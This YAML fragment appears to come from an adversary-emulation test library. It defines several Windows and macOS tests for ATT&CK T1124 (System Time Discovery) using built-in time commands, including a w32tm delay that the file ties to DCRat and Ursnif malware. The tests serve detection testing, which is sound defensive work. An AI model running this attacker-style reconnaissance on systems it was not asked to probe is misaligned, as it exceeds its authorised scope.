      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1124
    atomic_tests:
    - name: System Time Discovery
      auto_generated_guid: 20aba24b-e61f-4b26-b4ce-4784f763ca20
      description: 'Identify the system time. Upon execution, the local computer system
        time and timezone will be displayed.

        '
      supported_platforms:
      - windows
      input_arguments:
        computer_name:
          description: computer name to query
          type: string
          default: localhost
      executor:
        command: |
          net time \\#{computer_name}
          w32tm /tz
        name: command_prompt
    - name: System Time Discovery - PowerShell
      auto_generated_guid: 1d5711d6-655c-4a47-ae9c-6503c74fa877
      description: 'Identify the system time via PowerShell. Upon execution, the system
        time will be displayed.

        '
      supported_platforms:
      - windows
      executor:
        command: 'Get-Date

          '
        name: powershell
    - name: System Time Discovery in macOS
      auto_generated_guid: f449c933-0891-407f-821e-7916a21a1a6f
      description: "Identify system time. Upon execution, the local computer system
        time and timezone will be displayed. \n"
      supported_platforms:
      - macos
      executor:
        command: 'date

          '
        name: sh
    - name: System Time Discovery W32tm as a Delay
      auto_generated_guid: d5d5a6b0-0f92-42d8-985d-47aafa2dd4db
      description: |
        identifies DCRat delay time tactics using w32tm.
        https://research.splunk.com/endpoint/b2cc69e7-11ba-42dc-a269-59c069a48870/
        https://blogs.blackberry.com/en/2022/05/dirty-deeds-done-dirt-cheap-russian-rat-offers-backdoor-bargains
      supported_platforms:
      - windows
      executor:
        command: 'W32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2

          '
        name: command_prompt
    - name: System Time with Windows time Command
      auto_generated_guid: 53ead5db-7098-4111-bb3f-563be390e72e
      description: |
        Displays the current system time via the Windows builtin time command: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/time
        Recently observed in use in the wild during an incident involving Ursnif malware:
        https://github.com/The-DFIR-Report/Sigma-Rules/blob/dc72f0b557fc63347379be0a33439788256761c8/rules/windows/process_creation/proc_creation_win_system_time_lookup.yml
        https://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/
      supported_platforms:
      - windows
      executor:
        command: 'time

          '
        name: command_prompt
